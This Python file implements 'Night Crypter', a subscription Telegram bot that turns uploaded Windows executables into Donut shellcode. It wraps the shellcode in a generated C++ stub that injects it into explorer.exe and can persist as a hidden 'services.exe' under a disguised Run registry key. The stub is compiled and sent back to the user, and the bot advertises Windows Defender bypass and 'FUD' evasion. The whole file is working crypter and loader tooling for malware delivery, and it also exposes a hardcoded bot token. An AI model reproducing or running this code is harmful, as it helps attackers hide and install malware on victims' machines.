# bot.py (Updated with Donut shellcode)
import json
import os
from datetime import datetime, timedelta, time
from typing import Dict, Any, Optional
import subprocess
import donut
import warnings
from telegram.warnings import PTBUserWarning
import pytz
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters,
    ConversationHandler,
)

# ========== SETTINGS ==========
TOKEN = "8288860382:AAEBxNpEl81cnGKnOmauGEmMm7XkblkePYA"
ADMIN_ID = 7279467950  # Your Telegram ID
USERS_FILE = "json/users.json"
TIMEZONE = "Europe/Istanbul"
tzinfo = pytz.timezone(TIMEZONE)

warnings.filterwarnings("ignore", category=PTBUserWarning)

# File storage settings
STUBS_DIR = "stubs"
MAX_FILE_SIZE = 8 * 1024 * 1024  # 8 MB limit

# ============================

# ---------- JSON Operations ----------
def ensure_file(path: str, default):
    folder = os.path.dirname(path)
    if folder and not os.path.exists(folder):
        os.makedirs(folder, exist_ok=True)
    if not os.path.exists(path):
        with open(path, "w", encoding="utf-8") as f:
            json.dump(default, f, indent=4, ensure_ascii=False)

def load_json(path: str) -> Dict[str, Any]:
    ensure_file(path, {})
    with open(path, "r", encoding="utf-8") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            return {}

def save_json(path: str, data) -> None:
    ensure_file(path, data if isinstance(data, dict) else {})
    with open(path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4, ensure_ascii=False)

# ---------- User Functions ----------
def ensure_user_record(user_id: int) -> None:
    users = load_json(USERS_FILE)
    key = str(user_id)
    if key not in users:
        users[key] = {
            "a_expiry": None,
            "wd_bypass": False,
            "daily_used": 0,
            "daily_limit": 1
        }
        save_json(USERS_FILE, users)

def iso_now_plus_days(days: int) -> str:
    return (datetime.now(tzinfo) + timedelta(days=days)).isoformat()

def parse_iso(dt_iso: Optional[str]) -> Optional[datetime]:
    if not dt_iso:
        return None
    try:
        return datetime.fromisoformat(dt_iso).astimezone(tzinfo)
    except Exception:
        return None

def human_dt(dt: Optional[datetime]) -> str:
    if not dt:
        return "Not active"
    return dt.strftime("%d.%m.%Y %H:%M")

def set_expiry(user_id: int, plan: str, days: int) -> bool:
    users = load_json(USERS_FILE)
    key = str(user_id)
    if key not in users:
        ensure_user_record(user_id)
        users = load_json(USERS_FILE)
    expiry_iso = iso_now_plus_days(days)
    if plan == "a":
        users[key]["a_expiry"] = expiry_iso
    else:
        return False
    save_json(USERS_FILE, users)
    return True

def expiry_status_for_display(expiry_iso: Optional[str]) -> str:
    if not expiry_iso:
        return "Not active"
    dt = parse_iso(expiry_iso)
    if not dt:
        return "Invalid date"
    now = datetime.now(tzinfo)
    if dt <= now:
        return "Expired"
    return human_dt(dt)

def set_daily_limit(user_id: int, limit: int) -> None:
    users = load_json(USERS_FILE)
    key = str(user_id)
    if key not in users:
        ensure_user_record(user_id)
        users = load_json(USERS_FILE)
    users[key]["daily_limit"] = int(limit)
    save_json(USERS_FILE, users)

def has_active_subscription(user_id: int) -> bool:
    """Checks if a user has an active, non-expired subscription."""
    users = load_json(USERS_FILE)
    key = str(user_id)
    if key not in users:
        return False

    expiry_iso = users[key].get("a_expiry")
    if not expiry_iso:
        return False

    expiry_dt = parse_iso(expiry_iso)
    if not expiry_dt:
        return False

    return expiry_dt > datetime.now(tzinfo)

def can_user_crypt(user_id: int) -> bool:
    """Checks if the user is below their daily crypt limit."""
    users = load_json(USERS_FILE)
    key = str(user_id)
    if key not in users:
        ensure_user_record(user_id)
        users = load_json(USERS_FILE)
    used = users[key].get("daily_used", 0)
    limit = users[key].get("daily_limit", 1)
    return used < limit

def increment_crypt_count(user_id: int) -> None:
    """Increments the daily crypt count for a user."""
    users = load_json(USERS_FILE)
    key = str(user_id)
    if key not in users:
        # This should not happen if can_user_crypt was called first, but as a safeguard:
        ensure_user_record(user_id)
        users = load_json(USERS_FILE)

    used = users[key].get("daily_used", 0)
    users[key]["daily_used"] = used + 1
    save_json(USERS_FILE, users)

async def reset_all_daily_used(context: ContextTypes.DEFAULT_TYPE) -> None:
    """Resets the daily crypt count for all users."""
    users = load_json(USERS_FILE)
    changed = False
    for uid, u in users.items():
        if u.get("daily_used", 0) != 0:
            u["daily_used"] = 0
            changed = True
    if changed:
        save_json(USERS_FILE, users)
        print("Daily crypt counts have been reset for all users.")

# ---------- Helper: User Stubs Directory ----------
def user_stub_dir(user_id: int) -> str:
    path = os.path.join(STUBS_DIR, str(user_id))
    os.makedirs(path, exist_ok=True)
    return path

# ---------- Bot Handlers ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user is None:
        return
    ensure_user_record(user.id)
    keyboard = [
        [InlineKeyboardButton("Profile", callback_data="profile")],
        [InlineKeyboardButton("Plans", callback_data="plans")],
        [InlineKeyboardButton("Crypter", callback_data="crypter")]
    ]
    reply = InlineKeyboardMarkup(keyboard)

    banner_path = "assets/banner.png"
    if os.path.exists(banner_path):
        await update.message.reply_photo(photo=open(banner_path, 'rb'), caption="🌙 Night Crypter\n\nWelcome! Please select an option from the menu below.", reply_markup=reply)
    else:
        await update.message.reply_text("🌙 Night Crypter\n\nWelcome! Please select an option from the menu below.", reply_markup=reply)

async def edit_message(query: CallbackQuery, text: str, reply_markup: InlineKeyboardMarkup):
    """Edits a message, handling both text and photo-with-caption messages."""
    if query.message and query.message.photo:
        await query.edit_message_caption(caption=text, reply_markup=reply_markup)
    else:
        await query.edit_message_text(text=text, reply_markup=reply_markup)

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    if query is None:
        return
    await query.answer()
    data = query.data

    uid = str(query.from_user.id)
    users = load_json(USERS_FILE)
    user = users.get(uid)
    if not user:
        await edit_message(query, "Record not found. Please send /start.", None)
        return

    if data == "profile":
        a_disp = expiry_status_for_display(user.get("a_expiry"))
        daily_used = user.get("daily_used", 0)
        daily_limit = user.get("daily_limit", 1)
        keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
        reply = InlineKeyboardMarkup(keyboard)
        text = (
            f"📂 Profile\n\n"
            f"👤 ID: {uid}\n\n"
            f"⭐ Subscription: {a_disp}\n\n"
            f"🔁 Daily Crypt: {daily_used}/{daily_limit}\n"
        )
        await edit_message(query, text, reply)

    elif data == "plans":
        keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
        reply = InlineKeyboardMarkup(keyboard)
        text = "Contact the admin to purchase a subscription."
        await edit_message(query, text, reply)

    elif data == "crypter":
        if has_active_subscription(query.from_user.id):
            text = "✅ Subscription active (WD Bypass).\n\nPlease upload your .exe file to encrypt it."
        else:
            text = "❌ You do not have an active subscription.\n\nPlease contact the admin to purchase one."

        keyboard = [[InlineKeyboardButton("Back", callback_data="back")]]
        reply = InlineKeyboardMarkup(keyboard)
        await edit_message(query, text, reply)

    elif data == "back":
        keyboard = [
            [InlineKeyboardButton("Profile", callback_data="profile")],
            [InlineKeyboardButton("Plans", callback_data="plans")],
            [InlineKeyboardButton("Crypter", callback_data="crypter")]
        ]
        reply = InlineKeyboardMarkup(keyboard)
        await edit_message(query, "🌙 Night Crypter\n\nWelcome! Please select an option from the menu below.", reply)

# ---------- Admin and User Commands ----------
async def grant_a_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("Only the admin can use this command.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /grant_a <user_id> <days>")
        return
    try:
        target = int(args[0])
        days = int(args[1])
    except ValueError:
        await update.message.reply_text("user_id and days must be integers.")
        return
    if set_expiry(target, "a", days):
        expiry = load_json(USERS_FILE)[str(target)]["a_expiry"]
        await update.message.reply_text(f"Plan A granted -> {target} expiry: {expiry}")
        try:
            await context.bot.send_message(target, f"🎉 You have been granted Plan A (WD Killer). Expiry: {expiry}")
        except Exception:
            pass


async def set_daily_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("Only the admin can use this command.")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: /set_daily <user_id> <limit>")
        return
    try:
        target = int(context.args[0])
        limit = int(context.args[1])
    except ValueError:
        await update.message.reply_text("user_id and limit must be integers.")
        return
    set_daily_limit(target, limit)
    await update.message.reply_text(f"User {target}'s daily limit has been set to {limit}.")


# Conversation states
GET_FILENAME, GET_STARTUP_CHOICE = range(2)

async def file_upload_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handles the initial file upload and starts the conversation."""
    msg = update.message
    if msg is None or msg.document is None:
        return ConversationHandler.END

    doc = msg.document
    user = update.effective_user
    if user is None:
        return ConversationHandler.END
    uid = user.id

    # Check the daily limit before proceeding
    if not can_user_crypt(uid):
        u_data = load_json(USERS_FILE).get(str(uid), {})
        limit = u_data.get('daily_limit', 1)
        await msg.reply_text(f"You have already used your {limit} daily crypt(s). Please try again tomorrow.")
        return ConversationHandler.END

    if doc.file_size and doc.file_size > MAX_FILE_SIZE:
        await msg.reply_text(f"File is too large. Max size: {MAX_FILE_SIZE // (1024*1024)} MB.")
        return ConversationHandler.END

    udir = user_stub_dir(uid)
    # Use a unique name for the original uploaded file to avoid conflicts
    input_path = os.path.join(udir, f"original_{doc.file_id}.exe")

    try:
        file_obj = await context.bot.get_file(doc.file_id)
        await file_obj.download_to_drive(custom_path=input_path)
    except Exception as e:
        await msg.reply_text(f"Error downloading file: {e}")
        return ConversationHandler.END

    context.user_data['input_path'] = input_path

    await msg.reply_text("✅ File received. Please enter the desired name for your compiled file (e.g., 'my_payload.exe'):")

    return GET_FILENAME

import base64

async def get_filename(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Stores the desired filename and asks about startup persistence."""
    filename = update.message.text
    if not filename.lower().endswith('.exe'):
        filename += '.exe'

    context.user_data['output_filename'] = filename

    keyboard = [
        [
            InlineKeyboardButton("Yes", callback_data="startup_yes"),
            InlineKeyboardButton("No", callback_data="startup_no"),
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_text(
        "Filename saved. Should the file be added to startup for persistence?",
        reply_markup=reply_markup
    )

    return GET_STARTUP_CHOICE

async def get_startup_choice(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Stores startup choice, compiles with corrected persistence logic, and sends."""
    query = update.callback_query
    await query.answer()

    startup = query.data == 'startup_yes'

    input_path = context.user_data.get('input_path')
    output_filename = context.user_data.get('output_filename')

    if not input_path or not output_filename:
        await edit_message(query, "Error: Missing data. Please start over.", None)
        context.user_data.clear()
        return ConversationHandler.END

    uid = query.from_user.id
    udir = user_stub_dir(uid)
    cpp_file_path = os.path.join(udir, f"source_{uid}.cpp")
    compiled_exe_path = os.path.join(udir, f"compiled_{uid}.exe")

    try:
        await edit_message(query, "Processing your file... This may take a moment.", None)

        shellcode_bytes = donut.create(file=input_path)
        encoded_shellcode = base64.b85encode(shellcode_bytes).decode('ascii')

        startup_macro = "#define StartUP true" if startup else "#define StartUP false"

        # NOTE: The C++ stub is now logically corrected for persistence.
        cpp_template = f'''
#include <windows.h>
#include <string>
#include <vector>
#include <tlhelp32.h>
#include <stdlib.h>
#include <shlobj.h>
#include <shlwapi.h>

#pragma comment(lib, "shlwapi.lib")

{startup_macro}

// Base85 decoding function
std::vector<unsigned char> b85_decode(const std::string& b85_string) {{
    std::vector<unsigned char> decoded_data;
    unsigned int buffer = 0;
    int count = 0;
    for (char c : b85_string) {{
        if (c < '!' || c > 'u') continue;
        buffer = buffer * 85 + (c - 33);
        count++;
        if (count == 5) {{
            decoded_data.push_back(buffer >> 24);
            decoded_data.push_back(buffer >> 16);
            decoded_data.push_back(buffer >> 8);
            decoded_data.push_back(buffer);
            buffer = 0;
            count = 0;
        }}
    }}
    if (count > 0) {{
        for (int i = count; i < 5; i++) buffer = buffer * 85 + 84;
        for (int i = 0; i < count - 1; i++) {{
            decoded_data.push_back((buffer >> (24 - i * 8)) & 0xFF);
        }}
    }}
    return decoded_data;
}}

// Persistence function
void RegisterSystemTask(const std::string& executablePath) {{
    HKEY hKey;
    const char* runKey = "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run";
    const char* valueName = "SystemCoreService";
    if (RegOpenKeyExA(HKEY_CURRENT_USER, runKey, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {{
        RegSetValueExA(hKey, valueName, 0, REG_SZ, (const BYTE*)executablePath.c_str(), executablePath.length() + 1);
        RegCloseKey(hKey);
    }}
}}

// Process search function
DWORD FindTargetProcess(const std::string& processName) {{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;
    if (Process32First(snapshot, &entry) == TRUE) {{
        while (Process32Next(snapshot, &entry) == TRUE) {{
            if (_stricmp(entry.szExeFile, processName.c_str()) == 0) {{
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }}
        }}
    }}
    CloseHandle(snapshot);
    return 0;
}}

// The shellcode payload
const std::string b85_shellcode = "{encoded_shellcode}";

// The main payload injection logic
void InjectPayload() {{
    std::vector<unsigned char> shellcode = b85_decode(b85_shellcode);
    if (shellcode.empty()) return;

    DWORD pid = FindTargetProcess("explorer.exe");
    if (pid == 0) return;

    HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, pid);
    if (hProcess == NULL) return;

    PVOID pRemoteAddress = VirtualAllocEx(hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (pRemoteAddress == NULL) {{
        CloseHandle(hProcess);
        return;
    }}

    if (!WriteProcessMemory(hProcess, pRemoteAddress, shellcode.data(), shellcode.size(), NULL)) {{
        VirtualFreeEx(hProcess, pRemoteAddress, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return;
    }}

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAddress, NULL, 0, NULL);
    if (hThread != NULL) {{
        CloseHandle(hThread);
    }}
    CloseHandle(hProcess);
}}

// Main entry point with corrected persistence logic
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {{
#if StartUP
    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);

    char appDataPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath))) {{
        PathAppendA(appDataPath, "services.exe");

        // If we are not already running from the target path...
        if (_stricmp(currentPath, appDataPath) != 0) {{
            // ...copy self to target path, register for startup, and exit.
            if (CopyFileA(currentPath, appDataPath, FALSE)) {{ // FALSE to overwrite
                SetFileAttributesA(appDataPath, FILE_ATTRIBUTE_HIDDEN);
                RegisterSystemTask(appDataPath); // Register the NEW path
            }}
            return 0; // Exit. The payload runs from the new location on next startup.
        }}
    }}
#endif

    InjectPayload();
    return 0;
}}
'''
        with open(cpp_file_path, "w", encoding="utf-8") as f:
            f.write(cpp_template)

        compile_result = subprocess.run(
            ["g++", cpp_file_path, "-o", compiled_exe_path, "-mwindows", "-s", "-w", "-lshlwapi"],
            capture_output=True, text=True,
        )

        if compile_result.returncode != 0:
            error_msg = f"Compilation Error:\\n{compile_result.stderr}"
            print(f"Compilation failed for user {uid}:\\n{error_msg}")

            if len(error_msg) > 4000:
                error_msg = error_msg[:4000] + "\\n...(truncated)"

            await edit_message(query, error_msg, None)
            return ConversationHandler.END

        with open(compiled_exe_path, "rb") as f:
            await context.bot.send_document(chat_id=uid, document=f, filename=output_filename)

        increment_crypt_count(uid)
        await edit_message(query, "✅ File created and sent successfully.", None)

    except Exception as e:
        import traceback
        print(f"An exception occurred for user {uid}:")
        traceback.print_exc()
        await edit_message(query, f"An unexpected error occurred: {e}", None)

    finally:
        for path in [input_path, cpp_file_path, compiled_exe_path]:
            if path and os.path.exists(path):
                os.remove(path)
        context.user_data.clear()

    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancels and ends the conversation."""
    await update.message.reply_text("Operation cancelled.")
    input_path = context.user_data.get('input_path')
    if input_path and os.path.exists(input_path):
        os.remove(input_path)
    context.user_data.clear()
    return ConversationHandler.END


# ---------- Error Handler ----------
async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
    print("Error:", context.error)


# =========== Main Start ===========
def main():
    ensure_file(USERS_FILE, {})

    app = Application.builder().token(TOKEN).build()

    job_queue = app.job_queue
    reset_time = time(hour=0, minute=0, second=0, tzinfo=tzinfo)
    job_queue.run_daily(reset_all_daily_used, time=reset_time, name="daily_reset_job")

    conv_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Document.ALL, file_upload_handler)],
        states={
            GET_FILENAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_filename)],
            GET_STARTUP_CHOICE: [CallbackQueryHandler(get_startup_choice)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(conv_handler)
    app.add_handler(CommandHandler("start", start))
    # Note: The main callback_handler for the menu buttons is still needed for profile, plans, etc.
    app.add_handler(CallbackQueryHandler(callback_handler))
    app.add_handler(CommandHandler("grant_a", grant_a_cmd))
    app.add_handler(CommandHandler("set_daily", set_daily_cmd))

    app.add_error_handler(error_handler)

    banner_text = """
    ---------------------------------------
       Night Crypter (Telegram Bot)
    
    - 28.09.2025 - All Rights Reserved.
    
    - Made By Payload X Violent
    
    - Methods: Semi Bypass - Full FUD
     
    - Socials [ Tg: t.me/NightCrypter ]
    ---------------------------------------
    """
    print(banner_text)

    app.run_polling()

if __name__ == "__main__":
    main()
